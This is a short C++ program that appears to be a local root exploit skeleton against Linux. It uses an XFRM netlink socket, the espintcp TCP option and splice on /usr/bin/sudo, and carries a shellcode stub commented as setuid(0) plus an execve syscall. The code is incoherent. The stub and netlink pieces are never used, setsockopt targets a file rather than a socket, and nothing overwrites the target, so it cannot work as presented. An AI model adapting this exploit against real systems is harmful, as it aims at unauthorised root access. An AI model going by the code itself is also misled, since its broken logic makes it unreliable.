#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstdint>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif
#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif

static const uint8_t stub[] = {
    0x7f,0x45,0x4c,0x46,
    0xb0,0x69,0x0f,0x05, // setuid(0)
    0x6a,0x3b,0x58, /* push 59; pop rax */
    0x0f,0x05       /* syscall */
};

int main() {
    const char *victim = "/usr/bin/sudo";
    int xfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    struct xfrm_usersa_info xs{};
    int t = XFRM_MSG_NEWSA;
    int e = TCP_ENCAP_ESPINTCP;
    (void)xfd; (void)xs; (void)t; (void)e; (void)stub;
    int fd = open(victim, O_RDONLY);
    int pp[2];
    pipe(pp);
    loff_t off = 0;
    splice(fd, &off, pp[1], nullptr, 4096, 0);
    char ulp[] = "espintcp";
    setsockopt(fd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp));
    execve(victim, nullptr, nullptr);
    return 0;
}
